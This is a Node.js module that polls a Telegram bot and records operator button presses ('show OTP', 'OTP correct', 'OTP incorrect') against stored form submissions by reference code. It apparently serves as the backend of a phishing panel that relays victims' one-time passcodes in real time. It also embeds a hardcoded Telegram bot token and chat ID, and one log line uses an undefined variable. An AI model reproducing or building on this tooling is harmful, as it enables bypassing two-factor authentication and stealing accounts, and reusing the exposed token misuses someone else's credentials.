const axios = require("axios");
const db = require("./models");
const FormData = db.FormData;
const TELEGRAM_BOT_TOKEN = "5626992499:AAHfKlpL4ESnTjcXI61fXSx57cu0fW1pU_Y";
const TELEGRAM_CHAT_ID = "-1002170066715";
let lastUpdateId = 0;

async function getUpdates() {
  try {
    const response = await axios.get(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`,
      {
        params: {
          offset: lastUpdateId + 1,
          timeout: 10, // Set timeout to 10 seconds
        },
      }
    );

    const updates = response.data.result;
    if (updates.length > 0) {
      lastUpdateId = updates[updates.length - 1].update_id;
      for (const update of updates) {
        if (update.callback_query) {
          handleCallbackQuery(update.callback_query);
        }
      }
    }
  } catch (error) {
    if (error.response && error.response.status === 409) {
      //console.error("Another instance is running, retrying in 5 seconds...");
      setTimeout(getUpdates, 9000);
    } else {
      console.error("Error getting updates from Telegram:", error);
      setTimeout(getUpdates, 5000); // Retry after 5 seconds on other errors
    }
  }
}

// Function to handle callback queries
function handleCallbackQuery(callbackQuery) {
  const callbackData = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const callbackQueryId = callbackQuery.id;
  const messageId = callbackQuery.message.message_id;

  let responseText = "";

  switch (callbackData) {
    case "show_otp":
      responseText = "Showing OTP...";
      updateAction(callbackQuery.message.text, "otpShow"); // Update action in the database
      break;
    case "otp_correct":
      responseText = "OTP is correct.";
      updateAction(callbackQuery.message.text, "otpCorrect"); // Update action in the database
      break;
    case "otp_incorrect":
      responseText = "OTP is incorrect.";
      updateAction(callbackQuery.message.text, "otpIncorrect"); // Update action in the database
      break;
    default:
      responseText = "Unknown action.";
  }

  const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
  axios.post(answerUrl, {
    callback_query_id: callbackQueryId,
    text: responseText,
    show_alert: true, // This will show the popup as an alert
  }).then(response => {
    console.log('Callback query handled:', response.data);
  }).catch(error => {
    console.error('Error handling callback query:', error);
  });
}

// Function to update action in the database
function updateAction(messageText, actionUpdate) {
  const ref = extractRefFromMessage(messageText);
  console.log("---------------------------------------------");
  console.log(ref + "---" + actionUpdate);
  console.log("---------------------------------------------");
  if (ref) {
    FormData.update(
      { action: actionUpdate },
      {
        where: { ref: ref },
      }
    )
      .then((num) => {
        if (num == 1) {
          console.log("Form data updated with action:", action);
        } else {
          console.log(
            "Cannot update form data with action. Maybe form data was not found or req.body is empty!"
          );
        }
      })
      .catch((err) => {
        console.error("Error updating form data with action:", err);
      });
  }
}

// Extract ref from the message text
function extractRefFromMessage(messageText) {
  const refMatch = messageText.match(/Reference: (\w+)/);
  return refMatch ? refMatch[1] : null;
}

// Export the getUpdates function
module.exports = { getUpdates };

// Poll for updates every 2 seconds
setInterval(getUpdates, 2000);
